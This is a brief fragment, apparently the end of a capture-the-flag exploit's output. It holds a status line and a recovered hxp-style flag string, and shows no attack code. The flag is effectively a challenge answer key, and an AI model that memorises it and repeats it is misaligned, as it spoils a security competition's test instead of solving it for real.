[*] Hopefully flag is readable
hxp{t0p_d3feNSeS_Vs_1337_h@ck3rs}
```




